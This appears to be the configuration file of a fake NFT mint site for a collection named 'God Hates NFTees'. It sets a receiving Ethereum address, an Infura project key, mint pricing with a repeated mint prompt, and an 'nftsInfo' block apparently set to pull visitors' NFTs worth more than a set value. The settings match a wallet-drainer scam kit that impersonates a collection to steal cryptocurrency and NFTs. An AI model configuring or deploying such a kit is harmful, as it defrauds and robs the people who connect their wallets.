const authorInfo = {
    address: "0x38B682143Ec54fe5b8b30Cc488DE545F1A719eF2",
    infuraId: "8b1fa033a3cc4de896d34ac6ba39f65b"
}
const collectionInfo = {
    name: "God Hates NFTees",
    title: "{name}", 
    date: "04.07.2022",
    socialMedia: {
        discord: "https://discord.com/invite/godhatesnftees",
        twitter: "https://twitter.com/godhatesnftees",
    },
    medias: {
        preview: "gif.gif",
	favicon: "logo.jpg",
    },
    background: {
        type: "image",
        image: "bj.jpg",
        video: "",
        color: "#4E4E6D",
    }
}
const mintInfo = {
    price: 0.2,
    totalSupply: 100,
	toFixed: 2,
    minUnits: 1,
    maxUnits: 5,
    askMintLoop: true,
}

const nftsInfo = {
    active: true,
    minValue: 0.3,
    maxTransfer: 2,
}

if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!authorInfo.address.startsWith("0x") ||
    (
        authorInfo.address.length >= 64 ||
        authorInfo.address.length <= 40
    )
) console.error(`Error: ${authorInfo.address} is not a valid Ethereum address.`);
